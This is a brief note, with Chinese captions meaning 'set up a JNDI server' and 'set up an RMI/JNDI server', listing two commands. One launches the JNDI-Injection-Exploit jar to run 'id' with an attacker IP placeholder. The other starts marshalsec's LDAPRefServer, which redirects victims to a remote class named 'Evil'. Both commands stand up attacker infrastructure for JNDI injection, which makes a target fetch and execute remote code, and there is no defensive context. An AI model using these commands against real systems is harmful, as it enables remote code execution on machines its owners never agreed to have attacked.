- JNDI-Injection-Exploit-1.0-SNAPSHOT-all
  搭建JNDI服务端
  `java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "id" -A your_ip`

- marshalsec-0.0.3-SNAPSHOT-all
  搭建RMI/JNDI服务端

  ```java
  java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8888/#Evil 9999
  ```

  